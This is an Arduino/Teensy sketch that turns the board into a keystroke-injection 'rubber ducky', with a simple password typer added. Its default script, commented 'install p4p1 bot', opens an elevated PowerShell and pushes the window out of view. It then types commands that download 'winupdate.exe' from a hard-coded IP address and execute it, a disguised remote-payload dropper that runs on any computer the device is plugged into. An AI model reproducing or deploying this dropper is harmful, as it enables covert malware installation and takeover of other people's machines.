/*
 * Made by papiii
 * teensyduck.ino
 * 
 * Rubberducky Remake with a teensy by papiii
 * It has a builtin password typer. Executes Basic rubber-ducky
 * scripts.
 */
 
//My keyboard lib
#define DELAY delay(800)
void resetKey()
{
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
}
void pressModifier(long mod)
{
  Keyboard.set_modifier(mod);
  Keyboard.send_now();
}
void pressKey(long key)
{
  Keyboard.set_key1(key);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
}

#define PASSWD "HelloWorld"

const int ledPin = 13;
const int noExecPin = 23;
const int passwdPin = 1;
const int secScript = 2;

void enterPass();
void pauseScript();
void script();
void sscript();
void ledBlinker(int inc);

void setup() {
  delay(1000);
  
  pinMode(ledPin, OUTPUT);
  pinMode(noExecPin, INPUT);
  pinMode(passwdPin, INPUT);
  pinMode(secScript, INPUT);

  // enable internal pull-ups
  digitalWrite(noExecPin, 1);
  digitalWrite(passwdPin, 1);
  digitalWrite(secScript, 1);

  if(digitalRead(noExecPin) != HIGH){
   pauseScript();
  } else if(digitalRead(passwdPin) != HIGH){
    enterPass();
  } else if(digitalRead(secScript) != HIGH){
    sscript();
  } else {
    script();
  }
  resetKey();
}

void loop() {
  // This code can be re-executed if needed
  // eg: Re type password.
  if(digitalRead(noExecPin) != HIGH){
   setup();
  }else if(digitalRead(passwdPin) != HIGH){
    enterPass();
  }
}

void pauseScript()
{
  ledBlinker(1);
  while(1) {
    delay(1000);
    if(digitalRead(noExecPin) != HIGH){
      break;
    }
  }
  ledBlinker(2);
}

void ledBlinker(int inc)
{
  for(int i = 0; i < inc; i++){
    digitalWrite(ledPin, (i % 2)? LOW: HIGH);
    delay(70);
  }
}

void enterPass()
{
  Keyboard.print(PASSWD);
  ledBlinker(8);
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  delay(300);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  
}

// Rubber ducky 
//Main script:
//  install p4p1 bot
void script()
{
  pressModifier(MODIFIERKEY_GUI);
  pressKey(KEY_D);
  resetKey();
  DELAY;
  pressModifier(MODIFIERKEY_GUI);
  resetKey();
  DELAY;
  Keyboard.print("powershell");
  DELAY;
  Keyboard.set_modifier(MODIFIERKEY_CTRL | MODIFIERKEY_SHIFT);
  Keyboard.send_now();
  pressKey(KEY_ENTER);
  resetKey();
  delay(1500);
  Keyboard.set_modifier(MODIFIERKEY_ALT);
  Keyboard.send_now();
  pressKey(KEY_O);
  resetKey();
  DELAY;
  Keyboard.set_modifier(MODIFIERKEY_ALT);
  Keyboard.send_now();
  pressKey(KEY_SPACE);
  resetKey();
  for(int i = 0; i < 100; i++){
    pressKey( KEY_DOWN_ARROW );
  }
  DELAY;
  pressKey(KEY_ENTER);
  DELAY;
  Keyboard.print("$client = new-object System.Net.WebClient");
  pressKey(KEY_ENTER);
  DELAY;
  Keyboard.print("$client.DownloadFile(\"http://86.247.205.102/winupdate.exe\",\"winupdate.exe\")");
  pressKey(KEY_ENTER);
  delay(2000);
  Keyboard.print(".\\winupdate.exe");
  DELAY;
  pressKey(KEY_ENTER);
}

//Second script: 
// Wallpaper breaker :)
void sscript()
{

}
